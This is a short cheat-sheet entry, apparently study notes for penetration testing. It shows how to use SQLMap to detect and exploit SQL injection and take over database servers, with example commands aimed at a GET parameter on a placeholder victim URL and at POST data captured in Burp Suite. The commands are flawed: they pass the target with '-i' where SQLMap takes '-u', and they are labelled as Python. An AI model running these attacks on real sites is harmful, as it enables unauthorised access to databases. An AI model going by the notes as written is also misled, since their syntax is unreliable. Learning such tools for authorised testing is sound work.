### SQLMap

Automates the process of detecting and exploiting SQL Injection flaws and taking over od database servers.

You can **DETECT** and **EXPLOit** SQL injections.

#### SYNTAX

```python
sqlmap -i <URL> -p <injection parameter> [options]

sqlmap -i 'http://victmi.site/view.php?id=1141' -p id --technique=U

#This test the id parameter of the GET request for view.php. Moreover, it also tells
#SQLMap to use UNION based SQL injection technique

```

If we have to exploit a POST parameter, you have to use:

```python
sqlmap -i <URL> --data=<POST STRING> -p <injection parameter> [options]
#You can copy the POST string from a request intercepted in Burp Suite

```
